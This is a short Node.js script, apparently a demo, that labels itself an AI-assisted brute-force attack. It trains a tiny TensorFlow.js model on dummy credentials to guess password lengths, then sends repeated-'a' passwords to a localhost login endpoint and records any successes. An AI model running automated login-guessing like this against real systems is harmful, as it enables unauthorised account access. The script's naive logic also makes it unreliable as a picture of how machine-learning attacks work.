const axios = require('axios');
const tf = require('@tensorflow/tfjs');

// Konfigurationsvariablen
const BASE_URL = 'http://localhost:3000';
let successfulLogins = [];

// Dummy-Daten für das Training (Benutzername-/Passwort-Muster)
const trainingData = [
  { username: 'admin', password: 'admin123' },
  { username: 'user', password: 'password' },
  { username: 'test', password: '123456' },
  { username: 'user1', password: 'user1234' },
  { username: 'user2', password: 'password2' },
];


// Dummy-Modell für Passwortvorhersage
async function trainModel() {
   console.log('Train Modell:');
   const model = tf.sequential();
   model.add(tf.layers.dense({ inputShape: [1], units: 20, activation: 'relu' }));
   model.add(tf.layers.dense({ units: 10, activation: 'relu' }));
   model.add(tf.layers.dense({ units: 1, activation: 'linear' }));
   model.compile({ optimizer: 'adam', loss: 'meanSquaredError' });

   const xs = tf.tensor2d(trainingData.map((_, i) => [i]), [trainingData.length, 1]);
  const ys = tf.tensor2d(trainingData.map(data => data.password.length), [trainingData.length, 1]);


   await model.fit(xs, ys, { epochs: 5000 });
   return model;
}


// Brute-Force-Angriff mit KI
async function startAttack() {
  const model = await trainModel();

  for (let i = 0; i < trainingData.length; i++) {
    const username = trainingData[i].username;
    const predictedPasswordLength = model.predict(tf.tensor2d([[i]], [1, 1])).dataSync()[0];

    console.log(`Vorhergesagte Passwortlänge für ${username}: ${Math.round(predictedPasswordLength)}`);

    // Dynamische Passwort-Generierung
    let password = 'a'.repeat(Math.round(predictedPasswordLength));
    try {
      const response = await axios.post(`${BASE_URL}/login`, { username, password });
      if (response.data.includes('Login erfolgreich')) {
        console.log(`Erfolgreich: ${username}:${password}`);
        successfulLogins.push({ username, password });
      } else {
        console.log(`Fehlgeschlagen: ${username}:${password}`);
      }
    } catch (err) {
      console.error(`Fehler bei ${username}:${password} - ${err.message}`);
    }
  }

  console.log('Erfolgreiche Logins:', successfulLogins);
}

startAttack();
